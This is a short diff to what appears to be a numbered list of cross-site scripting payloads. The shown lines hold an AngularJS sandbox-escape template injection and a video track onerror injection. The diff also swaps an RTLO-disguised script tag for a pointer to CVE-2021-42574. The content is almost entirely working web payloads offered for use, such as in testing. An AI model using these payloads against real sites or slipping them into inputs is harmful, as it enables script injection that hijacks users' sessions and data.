@@ -162,7 +162,7 @@ Then if the page does document.write(x.innerHTML), the clobbered property trigge
 {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
 
 64. Unicode RTLO (Right‑to‑Left Override) trick (affects display only, but can mislead reviewers)
-<script>/*‮*/ alert(1) /*‭*/</script> – browser ignores the override, but code still runs.
+CVE-2021-42574 - Search for this
 
 65. Using onerror on a track element
 <video><track src=x onerror=alert(1)>
